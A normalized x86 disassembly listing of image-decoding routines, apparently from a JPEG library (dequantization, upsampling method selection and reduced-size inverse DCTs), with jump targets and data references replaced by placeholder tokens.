mov eax [ esp ]
mov edx [ eax ]
call [ edx ]
mov eax [ esp + 0x8 ]
mov edx [ eax + 0x50 ]
xor eax eax
mov ecx edx
mov edx [ esp + 0x14 ]
je r-xdata
mov [ esp + 0x10 ] sub_46bc0c
mov [ esp + 0xc ] 0x1
jmp r-xdata
dec ecx
je r-xdata
movzx ebx [ edx ]
mov [ ecx ] ebx
inc eax
add ecx 0x4
add edx 0x2
cmp eax 0x40
jl r-xdata
jmp r-xdata
mov eax [ esp + 0x8 ]
mov edx [ eax + 0x50 ]
xor eax eax
mov [ esp + 0x24 ] edx
mov ecx rw-data
mov edx [ esp + 0x14 ]
dec ecx
je r-xdata
mov [ esp + 0x10 ] sub_46b7dc
mov [ esp + 0xc ] 0x2
jmp r-xdata
jmp r-xdata
movzx ebx [ edx ]
movsx esi [ ecx ]
imul ebx esi
add ebx 0x800
mov esi [ esp + 0x24 ]
sar ebx 0xc
add ecx 0x2
mov [ esi ] ebx
add edx 0x2
add [ esp + 0x24 ] 0x4
inc eax
cmp eax 0x40
jl r-xdata
jmp r-xdata
mov eax [ esp + 0x8 ]
mov edx [ eax + 0x50 ]
xor eax eax
mov [ esp + 0x18 ] edx
xor edx edx
mov [ esp + 0x1c ] edx
mov [ esp + 0x28 ] rw-data
jmp r-xdata
mov edx [ esp ]
mov ecx [ edx ]
mov [ ecx + 0x14 ] 0x2f
mov eax [ esp ]
mov edx [ eax ]
call [ edx ]
jmp r-xdata
movzx ebp [ edx ]
mov [ esp + 0x2c ] ebp
add edx 0x2
fild [ esp + 0x2c ]
inc eax
inc edi
fmul [ esi ]
fmul [ ecx ]
add ecx 0x8
fstp [ ebx ]
add ebx 0x4
cmp edi 0x8
jl r-xdata
inc [ esp + 0x1c ]
add [ esp + 0x28 ] 0x8
cmp [ esp + 0x1c ] 0x8
jl r-xdata
mov eax [ esp ]
mov edx [ eax ]
mov [ edx + 0x14 ] 0x2f
mov eax [ esp ]
mov edx [ eax ]
call [ edx ]
xor edi edi
mov edx [ esp + 0x18 ]
lea ebx [ edx + eax * 4 ]
mov ecx rw-data
mov edx [ esp + 0x28 ]
mov esi edx
mov edx [ esp + 0x14 ]
lea edx [ edx + eax * 2 ]
jmp r-xdata
sub_461c08
push ebx
push esi
mov esi eax
push edi
mov eax esi
push ebp
push ecx
mov ecx 0x54
mov ebx [ eax + 0x4 ]
mov edx 0x1
call [ ebx ]
mov [ esi + 0x1b2 ] eax
mov [ eax ] sub_461998
xor edx edx
lea edi [ eax + 0x2c ]
mov [ esp ] edx
mov ebx [ esi + 0xd4 ]
jmp r-xdata
mov edx [ esp ]
cmp edx [ esi + 0x20 ]
jl r-xdata
mov eax esi
mov ecx 0x100
mov edx 0x1
mov ebp [ eax + 0x4 ]
call [ ebp ]
mov [ ebx + 0x50 ] eax
push 0x100
push 0x0
mov eax [ ebx + 0x50 ]
push eax
call sub_46a318
add esp 0xc
mov [ edi ] 0xffffffff
add edi 0x4
inc [ esp ]
add ebx 0x54
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_461c9c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
mov esi eax
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx [ esi + 0x1b6 ]
mov eax [ ebx + 0x5c ]
cmp eax [ esi + 0x12a ]
jl r-xdata
mov edx [ esi + 0x12a ]
mov eax [ ebx + 0x5c ]
sub edx eax
mov [ ebp - 0x14 ] edx
mov edx [ ebx + 0x60 ]
cmp edx [ ebp - 0x14 ]
jae r-xdata
xor edx edx
mov [ ebp - 0xc ] edx
mov ecx [ esi + 0xd4 ]
mov [ ebp - 0x10 ] ecx
mov eax [ ebp - 0x4 ]
mov edx eax
mov [ ebp - 0x1c ] edx
lea ecx [ ebx + 0x34 ]
mov [ ebp - 0x18 ] ecx
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
sub [ ebp + 0x8 ] edx
mov ecx [ ebp - 0x14 ]
cmp ecx [ ebp + 0x8 ]
jbe r-xdata
mov [ ebp - 0x14 ] edx
mov ecx [ ebp - 0xc ]
cmp ecx [ esi + 0x20 ]
jl r-xdata
shl edx 0x2
mov ecx eax
add edx [ ebp + 0x10 ]
mov eax esi
push edx
mov edx [ ebp - 0x14 ]
push edx
lea edx [ ebx + 0xc ]
mov edi [ eax + 0x1ba ]
call [ edi + 0x4 ]
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
mov ecx [ ebp - 0x14 ]
sub [ ebx + 0x60 ] ecx
mov eax [ ebx + 0x5c ]
add eax [ ebp - 0x14 ]
mov [ ebx + 0x5c ] eax
cmp eax [ esi + 0x12a ]
jl r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x14 ] ecx
mov eax [ ebp - 0xc ]
shl eax 0x2
add eax ebx
add eax 0xc
push eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x18 ]
mov edi [ ebp - 0x18 ]
mov ecx [ edx ]
imul ecx [ eax + 0x30 ]
mov edx [ ebp - 0x1c ]
mov eax esi
shl ecx 0x2
add ecx [ edx ]
mov edx [ ebp - 0x10 ]
call [ edi ]
add [ ebp - 0x18 ] 0x4
add [ ebp - 0x1c ] 0x4
inc [ ebp - 0xc ]
add [ ebp - 0x10 ] 0x54
xor eax eax
mov [ ebx + 0x5c ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov edx [ ebp - 0x8 ]
inc [ edx ]
sub_461db8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ ebp + 0x8 ]
mov eax [ eax + 0x1b6 ]
mov ebx [ ebx ]
mov [ ebp - 0x8 ] ebx
mov ebx [ edx + 0x4 ]
xor edx edx
movzx esi [ eax + ebx + 0x8c ]
mov [ ebp - 0xc ] esi
movzx eax [ eax + ebx + 0x96 ]
mov [ ebp - 0x10 ] eax
mov eax edx
mov [ ebp - 0x14 ] edx
lea ecx [ ecx + eax * 4 ]
mov [ ebp - 0x18 ] ecx
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x12a ]
cmp ecx [ ebp - 0x14 ]
jg r-xdata
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
mov esi [ eax ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + edx * 4 ]
mov edx [ ebp - 0x4 ]
mov edi [ edx + 0x6c ]
add edi eax
cmp edi eax
jbe r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebp - 0x10 ] 0x1
jle r-xdata
mov cl [ esi ]
inc esi
mov edx [ ebp - 0xc ]
test edx edx
jle r-xdata
add [ ebp - 0x18 ] 0x4
mov eax [ ebp - 0x10 ]
add [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
inc eax
push eax
mov eax [ ebp - 0x10 ]
dec eax
push eax
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x6c ]
push ecx
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x8 ]
call sub_464490
cmp edi eax
ja r-xdata
mov [ eax ] cl
inc eax
dec edx
test edx edx
jg r-xdata
sub_461e74
push ebp
mov ebp esp
add esp 0xfffffff4
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0xc ] eax
mov eax ecx
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x12a ]
cmp edx [ ebp - 0x8 ]
jg r-xdata
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov esi [ eax ]
mov edx [ edx ]
mov edi [ ecx + 0x6c ]
add edi edx
cmp edi edx
jbe r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
inc [ ebp - 0x8 ]
add [ ebp - 0xc ] 0x4
add eax 0x4
mov cl [ esi ]
inc esi
mov [ edx ] cl
inc edx
mov [ edx ] cl
inc edx
cmp edi edx
ja r-xdata
sub_461ed0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
xor eax eax
mov [ ebp - 0x8 ] edx
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0x8 ]
mov ebx [ ebp - 0xc ]
lea eax [ ecx + eax * 4 ]
lea edx [ edx + ebx * 4 ]
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x12a ]
cmp ecx [ ebp - 0xc ]
jg r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x10 ]
mov eax [ eax ]
mov esi [ edx + 0x6c ]
add esi eax
mov ecx [ ecx ]
cmp esi eax
jbe r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0xc ]
inc eax
push eax
push 0x1
mov ecx [ ebp - 0x4 ]
mov eax [ ecx + 0x6c ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_464490
add [ ebp - 0x10 ] 0x4
add [ ebp - 0xc ] 0x2
add [ ebp - 0x14 ] 0x8
mov dl [ ecx ]
inc ecx
mov [ eax ] dl
inc eax
mov [ eax ] dl
inc eax
cmp esi eax
ja r-xdata
sub_461f60
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
xor edx edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] eax
mov eax ecx
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x12a ]
cmp ecx [ ebp - 0xc ]
jg r-xdata
mov esi [ eax ]
mov edx [ ebp - 0x10 ]
mov ecx [ edx ]
xor edx edx
mov dl [ esi ]
inc esi
mov [ ecx ] dl
inc ecx
lea edx [ edx + edx * 2 ]
xor ebx ebx
mov bl [ esi ]
add edx ebx
add edx 0x2
sar edx 0x2
mov [ ecx ] dl
inc ecx
mov edx [ ebp - 0x8 ]
mov edi [ edx + 0x28 ]
sub edi 0x2
test edi edi
jbe r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor edx edx
mov dl [ esi ]
movzx esi [ esi - 0x1 ]
lea ebx [ edx + edx * 2 ]
add ebx esi
inc ebx
sar ebx 0x2
mov [ ecx ] bl
inc ecx
mov [ ecx ] dl
inc [ ebp - 0xc ]
add [ ebp - 0x10 ] 0x4
add eax 0x4
xor edx edx
xor ebx ebx
mov dl [ esi ]
inc esi
dec edi
mov bl [ esi - 0x2 ]
lea edx [ edx + edx * 2 ]
add ebx edx
inc ebx
sar ebx 0x2
mov [ ecx ] bl
xor ebx ebx
mov bl [ esi ]
inc ecx
add edx ebx
add edx 0x2
sar edx 0x2
mov [ ecx ] dl
inc ecx
test edi edi
ja r-xdata
sub_462014
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x1c ] eax
mov ebx eax
lea eax [ ecx + ebx * 4 ]
mov [ ebp - 0x2c ] eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ecx + 0x12a ]
cmp eax [ ebp - 0x1c ]
jg r-xdata
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x1c ]
lea eax [ eax + ecx * 4 ]
mov [ ebp - 0x28 ] eax
mov ecx [ ebp - 0x2c ]
mov eax ecx
mov [ ebp - 0x24 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x24 ]
mov eax [ ecx + 0x4 ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x24 ]
mov eax [ ecx - 0x4 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
lea eax [ esi + esi * 2 ]
add eax [ ebp - 0x14 ]
add eax 0x8
sar eax 0x4
mov [ ecx ] al
mov eax esi
shl eax 0x2
inc ecx
add eax 0x7
sar eax 0x4
mov [ ecx ] al
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x2
jl r-xdata
mov eax [ ebp - 0xc ]
movzx eax [ eax ]
lea edi [ eax + eax * 2 ]
mov eax [ ebp - 0x10 ]
movzx eax [ eax ]
inc [ ebp - 0x10 ]
add edi eax
inc [ ebp - 0xc ]
lea eax [ esi + esi * 2 ]
mov ebx eax
add eax edi
add ebx [ ebp - 0x14 ]
add eax 0x7
add ebx 0x8
sar ebx 0x4
mov [ ecx ] bl
inc ecx
sar eax 0x4
mov [ ecx ] al
mov [ ebp - 0x14 ] esi
dec [ ebp - 0x18 ]
inc ecx
cmp [ ebp - 0x18 ] 0x0
mov esi edi
ja r-xdata
mov ecx [ ebp - 0x28 ]
mov ecx [ ecx ]
inc [ ebp - 0x1c ]
add [ ebp - 0x28 ] 0x4
mov eax [ ebp - 0xc ]
movzx eax [ eax ]
lea esi [ eax + eax * 2 ]
mov eax [ ebp - 0x10 ]
movzx eax [ eax ]
inc [ ebp - 0x10 ]
inc [ ebp - 0xc ]
add esi eax
mov eax [ ebp - 0xc ]
movzx eax [ eax ]
lea edi [ eax + eax * 2 ]
mov eax [ ebp - 0x10 ]
movzx eax [ eax ]
add edi eax
mov eax esi
inc [ ebp - 0x10 ]
inc [ ebp - 0xc ]
shl eax 0x2
add eax 0x8
sar eax 0x4
mov [ ecx ] al
lea eax [ esi + esi * 2 ]
add eax edi
inc ecx
add eax 0x7
sar eax 0x4
mov [ ecx ] al
mov [ ebp - 0x14 ] esi
mov eax [ edx + 0x28 ]
inc ecx
sub eax 0x2
mov esi edi
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
jbe r-xdata
mov ecx [ ebp - 0x24 ]
mov eax [ ecx ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
add [ ebp - 0x2c ] 0x4
sub_462168
push ebx
mov ebx eax
mov eax ebx
push esi
push edi
push ebp
mov esi [ eax + 0x4 ]
add esp 0xffffffe4
mov ecx 0xa0
mov edx 0x1
call [ esi ]
mov [ esp ] eax
mov eax [ esp ]
mov [ ebx + 0x1b6 ] eax
mov edx [ esp ]
mov [ edx ] sub_461c84
mov ecx [ esp ]
mov [ ecx + 0x4 ] sub_461c9c
mov eax [ esp ]
xor edx edx
mov [ eax + 0x8 ] edx
cmp [ ebx + 0x122 ] 0x0
je r-xdata
cmp [ ebx + 0x48 ] 0x0
je r-xdata
mov ecx [ ebx ]
mov eax ebx
mov [ ecx + 0x14 ] 0x17
mov edx [ eax ]
call [ edx ]
xor ecx ecx
jmp r-xdata
cmp [ ebx + 0x12e ] 0x1
jg r-xdata
mov [ esp + 0xc ] ecx
xor eax eax
mov [ esp + 0x4 ] eax
mov edi [ ebx + 0xd4 ]
mov eax [ esp ]
lea edx [ eax + 0x8c ]
mov [ esp + 0x18 ] edx
mov ecx [ esp ]
lea esi [ ecx + 0x64 ]
jmp r-xdata
mov ecx 0x1
mov eax [ esp + 0x4 ]
cmp eax [ ebx + 0x20 ]
jl r-xdata
mov eax [ edi + 0x8 ]
mov ecx [ edi + 0x24 ]
imul ecx
cdq
idiv [ ebx + 0x12e ]
mov ebp eax
mov eax [ edi + 0xc ]
imul ecx
cdq
idiv [ ebx + 0x12e ]
mov ecx eax
mov eax [ ebx + 0x126 ]
mov [ esp + 0x10 ] eax
mov edx [ ebx + 0x12a ]
mov [ esp + 0x14 ] edx
mov [ esi ] ecx
mov [ esp + 0x8 ] 0x1
cmp [ edi + 0x30 ] 0x0
jne r-xdata
add esp 0x1c
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebp [ esp + 0x10 ]
jne r-xdata
mov [ esi - 0x30 ] sub_461da8
xor ecx ecx
mov [ esp + 0x8 ] ecx
jmp r-xdata
mov edx ebp
add edx edx
cmp edx [ esp + 0x10 ]
jne r-xdata
cmp ecx [ esp + 0x14 ]
jne r-xdata
cmp [ esp + 0x8 ] 0x0
je r-xdata
mov eax ebp
add eax eax
cmp eax [ esp + 0x10 ]
jne r-xdata
cmp ecx [ esp + 0x14 ]
jne r-xdata
mov [ esi - 0x30 ] sub_461d9c
xor eax eax
mov [ esp + 0x8 ] eax
jmp r-xdata
add esi 0x4
inc [ esp + 0x18 ]
inc [ esp + 0x4 ]
add edi 0x54
mov ecx [ ebx + 0x12a ]
push ecx
mov edx [ ebx + 0x126 ]
mov eax [ ebx + 0x6c ]
call sub_464478
mov ecx eax
mov eax ebx
mov edx 0x1
mov ebp [ eax + 0x4 ]
call [ ebp + 0x8 ]
mov [ esi - 0x58 ] eax
mov eax [ esp + 0x10 ]
cdq
idiv ebp
test edx edx
jne r-xdata
mov edx ecx
add edx edx
cmp edx [ esp + 0x14 ]
jne r-xdata
cmp [ esp + 0xc ] 0x0
je r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x25
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ esp + 0x14 ]
cdq
idiv ecx
test edx edx
jne r-xdata
cmp [ esp + 0xc ] 0x0
je r-xdata
mov [ esi - 0x30 ] sub_461e74
jmp r-xdata
cmp [ edi + 0x28 ] 0x2
jbe r-xdata
mov [ esi - 0x30 ] sub_461db8
mov eax [ esp + 0x10 ]
cdq
idiv ebp
mov edx [ esp + 0x18 ]
mov [ edx ] al
mov eax [ esp + 0x14 ]
cdq
idiv ecx
mov ecx [ esp + 0x18 ]
mov [ ecx + 0xa ] al
jmp r-xdata
mov [ esi - 0x30 ] sub_461ed0
jmp r-xdata
cmp [ edi + 0x28 ] 0x2
jbe r-xdata
mov [ esi - 0x30 ] sub_461f60
jmp r-xdata
mov [ esi - 0x30 ] sub_462014
mov ecx [ esp ]
mov [ ecx + 0x8 ] 0x1
jmp r-xdata
sub_462380
push ebp
mov ebp esp
add esp 0xffffff58
push ebx
push esi
push edi
mov eax [ eax + 0x136 ]
add eax 0x80
mov [ ebp - 0x20 ] eax
mov ebx ecx
mov eax [ edx + 0x50 ]
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0xa8 ]
mov [ ebp - 0x24 ] 0x8
add ebx 0x2
add [ ebp - 0x1c ] 0x4
add eax 0x4
dec [ ebp - 0x24 ]
cmp [ ebp - 0x24 ] 0x0
jg r-xdata
mov dx [ ebx + 0x10 ]
or dx [ ebx + 0x20 ]
or dx [ ebx + 0x30 ]
or dx [ ebx + 0x50 ]
or dx [ ebx + 0x60 ]
or dx [ ebx + 0x70 ]
jne r-xdata
cmp [ ebp - 0x24 ] 0x4
je r-xdata
lea eax [ ebp - 0xa8 ]
xor edx edx
mov [ ebp - 0x24 ] edx
mov edx [ ebp + 0xc ]
mov ecx edx
mov [ ebp - 0x28 ] ecx
movsx edx [ ebx ]
mov ecx [ ebp - 0x1c ]
mov esi [ ebp - 0x1c ]
imul edx [ ecx ]
movsx ecx [ ebx + 0x20 ]
imul ecx [ esi + 0x40 ]
mov [ ebp - 0x10 ] ecx
movsx ecx [ ebx + 0x60 ]
mov esi [ ebp - 0x1c ]
imul ecx [ esi + 0xc0 ]
mov [ ebp - 0x14 ] ecx
mov ecx [ ebp - 0x10 ]
mov esi ecx
shl ecx 0x4
sub ecx esi
shl ecx 0x2
sub ecx esi
shl edx 0xe
lea ecx [ esi + ecx * 8 ]
shl ecx 0x5
add ecx esi
mov esi [ ebp - 0x14 ]
mov edi esi
neg esi
lea esi [ edi + esi * 4 ]
shl esi 0x4
sub esi edi
shl esi 0x6
add esi edi
add esi esi
add ecx esi
lea esi [ ecx + edx ]
sub edx ecx
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x8 ] edx
movsx edx [ ebx + 0x70 ]
mov ecx [ ebp - 0x1c ]
imul edx [ ecx + 0xe0 ]
mov [ ebp - 0xc ] edx
movsx edx [ ebx + 0x50 ]
mov ecx [ ebp - 0x1c ]
imul edx [ ecx + 0xa0 ]
mov [ ebp - 0x10 ] edx
movsx edx [ ebx + 0x30 ]
mov ecx [ ebp - 0x1c ]
imul edx [ ecx + 0x60 ]
mov [ ebp - 0x14 ] edx
movsx edx [ ebx + 0x10 ]
mov ecx [ ebp - 0x1c ]
imul edx [ ecx + 0x20 ]
mov [ ebp - 0x18 ] edx
mov edx [ ebp - 0xc ]
mov ecx edx
neg edx
lea edx [ ecx + edx * 8 ]
lea edx [ ecx + edx * 4 ]
shl edx 0x5
sub edx ecx
imul ecx [ ebp - 0x10 ] 0x2e75
add edx edx
add edx ecx
imul ecx [ ebp - 0x14 ] 0xffffba79
add edx ecx
mov ecx [ ebp - 0x18 ]
mov esi ecx
shl ecx 0x4
add ecx esi
shl ecx 0x6
sub ecx esi
lea ecx [ esi + ecx * 8 ]
add edx ecx
mov ecx [ ebp - 0xc ]
mov esi ecx
neg ecx
shl ecx 0x6
sub ecx esi
shl ecx 0x2
sub ecx esi
imul esi [ ebp - 0x10 ] 0xffffecc2
shl ecx 0x4
add ecx esi
imul esi [ ebp - 0x14 ] 0x1ccd
add ecx esi
mov esi [ ebp - 0x18 ]
mov edi esi
lea esi [ edi + esi * 4 ]
lea esi [ edi + esi * 8 ]
shl esi 0x8
add esi edi
lea esi [ edi + esi * 2 ]
add ecx esi
mov esi [ ebp - 0x4 ]
add esi ecx
add esi 0x800
sar esi 0xc
mov [ eax ] esi
mov esi [ ebp - 0x4 ]
sub esi ecx
add esi 0x800
sar esi 0xc
mov [ eax + 0x60 ] esi
mov ecx [ ebp - 0x8 ]
add ecx edx
add ecx 0x800
sar ecx 0xc
mov [ eax + 0x20 ] ecx
mov ecx [ ebp - 0x8 ]
sub ecx edx
add ecx 0x800
sar ecx 0xc
mov [ eax + 0x40 ] ecx
movsx edx [ ebx ]
mov ecx [ ebp - 0x1c ]
imul edx [ ecx ]
shl edx 0x2
mov [ eax ] edx
mov [ eax + 0x20 ] edx
mov [ eax + 0x40 ] edx
mov [ eax + 0x60 ] edx
jmp r-xdata
mov ecx [ eax + 0x8 ]
mov edx [ eax ]
mov ebx ecx
shl ecx 0x4
sub ecx ebx
shl ecx 0x2
sub ecx ebx
shl edx 0xe
lea ecx [ ebx + ecx * 8 ]
shl ecx 0x5
add ecx ebx
mov ebx [ eax + 0x18 ]
mov edi ebx
neg ebx
lea ebx [ edi + ebx * 4 ]
shl ebx 0x4
sub ebx edi
shl ebx 0x6
add ebx edi
add ebx ebx
add ecx ebx
lea ebx [ ecx + edx ]
sub edx ecx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] edx
mov edx [ eax + 0x1c ]
mov [ ebp - 0xc ] edx
mov ecx [ eax + 0x14 ]
mov [ ebp - 0x10 ] ecx
mov edx [ eax + 0xc ]
mov [ ebp - 0x14 ] edx
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x18 ] ecx
mov edx [ ebp - 0xc ]
mov ecx edx
neg edx
lea edx [ ecx + edx * 8 ]
lea edx [ ecx + edx * 4 ]
shl edx 0x5
sub edx ecx
imul ecx [ ebp - 0x10 ] 0x2e75
add edx edx
add edx ecx
imul ecx [ ebp - 0x14 ] 0xffffba79
add edx ecx
mov ecx [ ebp - 0x18 ]
mov ebx ecx
shl ecx 0x4
add ecx ebx
shl ecx 0x6
sub ecx ebx
lea ecx [ ebx + ecx * 8 ]
add edx ecx
mov ecx [ ebp - 0xc ]
mov ebx ecx
neg ecx
shl ecx 0x6
sub ecx ebx
shl ecx 0x2
sub ecx ebx
imul ebx [ ebp - 0x10 ] 0xffffecc2
shl ecx 0x4
add ecx ebx
imul ebx [ ebp - 0x14 ] 0x1ccd
add ecx ebx
mov ebx [ ebp - 0x18 ]
mov edi ebx
lea ebx [ edi + ebx * 4 ]
lea ebx [ edi + ebx * 8 ]
shl ebx 0x8
add ebx edi
lea ebx [ edi + ebx * 2 ]
mov edi [ ebp - 0x20 ]
add ecx ebx
mov ebx [ ebp - 0x4 ]
add ebx ecx
add ebx 0x40000
sar ebx 0x13
and ebx 0x3ff
mov bl [ edi + ebx ]
mov [ esi ] bl
mov ebx [ ebp - 0x4 ]
sub ebx ecx
mov ecx [ ebp - 0x20 ]
add ebx 0x40000
sar ebx 0x13
and ebx 0x3ff
mov cl [ ecx + ebx ]
mov [ esi + 0x3 ] cl
mov ecx [ ebp - 0x8 ]
mov ebx [ ebp - 0x20 ]
add ecx edx
add ecx 0x40000
sar ecx 0x13
and ecx 0x3ff
mov cl [ ebx + ecx ]
mov [ esi + 0x1 ] cl
mov ecx [ ebp - 0x8 ]
sub ecx edx
mov edx [ ebp - 0x20 ]
add ecx 0x40000
sar ecx 0x13
and ecx 0x3ff
add eax 0x20
mov dl [ edx + ecx ]
mov [ esi + 0x2 ] dl
mov ecx [ eax ]
add ecx 0x10
sar ecx 0x5
and ecx 0x3ff
mov edx [ ebp - 0x20 ]
mov dl [ edx + ecx ]
mov [ esi ] dl
mov [ esi + 0x1 ] dl
mov [ esi + 0x2 ] dl
mov [ esi + 0x3 ] dl
add eax 0x20
jmp r-xdata
mov edx [ ebp - 0x28 ]
mov esi [ edx ]
mov edx [ eax + 0x4 ]
or edx [ eax + 0x8 ]
add esi [ ebp + 0x8 ]
or edx [ eax + 0xc ]
or edx [ eax + 0x14 ]
or edx [ eax + 0x18 ]
or edx [ eax + 0x1c ]
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
inc [ ebp - 0x24 ]
add [ ebp - 0x28 ] 0x4
cmp [ ebp - 0x24 ] 0x4
jl r-xdata
sub_462714
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov eax [ eax + 0x136 ]
add eax 0x80
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x54 ]
mov edx [ edx + 0x50 ]
mov [ ebp - 0x8 ] edx
mov edx 0x8
add ecx 0x2
add [ ebp - 0x8 ] 0x4
add eax 0x4
dec edx
test edx edx
jg r-xdata
cmp edx 0x4
je r-xdata
cmp edx 0x6
je r-xdata
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x54 ]
mov [ ebp - 0x14 ] ecx
xor edx edx
cmp edx 0x2
je r-xdata
mov ebx [ eax ]
shl ebx 0xf
mov [ ebp - 0x4 ] ebx
imul ebx [ eax + 0x14 ] 0x1b37
imul esi [ eax + 0x1c ] 0xffffe8ee
add esi ebx
imul ebx [ eax + 0xc ] 0xffffd746
add esi ebx
mov ebx [ eax + 0x4 ]
mov edi ebx
shl ebx 0x3
sub ebx edi
lea ebx [ edi + ebx * 4 ]
shl ebx 0x8
sub ebx edi
mov edi [ ebp - 0xc ]
shl ebx 0x2
add esi ebx
mov ebx [ ebp - 0x4 ]
add ebx esi
add ebx 0x80000
sar ebx 0x14
and ebx 0x3ff
mov bl [ edi + ebx ]
mov [ ecx ] bl
mov ebx [ ebp - 0x4 ]
sub ebx esi
mov esi [ ebp - 0xc ]
add ebx 0x80000
sar ebx 0x14
and ebx 0x3ff
add eax 0x20
mov bl [ esi + ebx ]
mov [ ecx + 0x1 ] bl
mov ebx [ eax ]
mov esi [ ebp - 0xc ]
add ebx 0x10
sar ebx 0x5
and ebx 0x3ff
add eax 0x20
mov bl [ esi + ebx ]
mov [ ebp - 0xd ] bl
mov bl [ ebp - 0xd ]
mov [ ecx ] bl
mov bl [ ebp - 0xd ]
mov [ ecx + 0x1 ] bl
jmp r-xdata
mov bx [ ecx + 0x10 ]
or bx [ ecx + 0x30 ]
or bx [ ecx + 0x50 ]
or bx [ ecx + 0x70 ]
jne r-xdata
mov ecx [ ebp - 0x14 ]
mov ebx [ eax + 0x4 ]
or ebx [ eax + 0xc ]
or ebx [ eax + 0x14 ]
mov ecx [ ecx ]
add ecx [ ebp + 0x8 ]
or ebx [ eax + 0x1c ]
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
inc edx
add [ ebp - 0x14 ] 0x4
cmp edx 0x2
jl r-xdata
movsx ebx [ ecx ]
mov esi [ ebp - 0x8 ]
imul ebx [ esi ]
shl ebx 0xf
mov [ ebp - 0x4 ] ebx
movsx ebx [ ecx + 0x70 ]
mov esi [ ebp - 0x8 ]
mov edi [ ebp - 0x8 ]
imul ebx [ esi + 0xe0 ]
imul esi ebx 0xffffe8ee
movsx ebx [ ecx + 0x50 ]
imul ebx [ edi + 0xa0 ]
imul ebx ebx 0x1b37
add esi ebx
mov edi [ ebp - 0x8 ]
movsx ebx [ ecx + 0x30 ]
imul ebx [ edi + 0x60 ]
imul ebx ebx 0xffffd746
add esi ebx
mov edi [ ebp - 0x8 ]
movsx ebx [ ecx + 0x10 ]
imul ebx [ edi + 0x20 ]
mov edi ebx
shl ebx 0x3
sub ebx edi
lea ebx [ edi + ebx * 4 ]
shl ebx 0x8
sub ebx edi
shl ebx 0x2
add esi ebx
mov ebx [ ebp - 0x4 ]
add ebx esi
add ebx 0x1000
sar ebx 0xd
mov [ eax ] ebx
mov ebx [ ebp - 0x4 ]
sub ebx esi
add ebx 0x1000
sar ebx 0xd
mov [ eax + 0x20 ] ebx
movsx ebx [ ecx ]
mov esi [ ebp - 0x8 ]
imul ebx [ esi ]
shl ebx 0x2
mov [ eax ] ebx
mov [ eax + 0x20 ] ebx
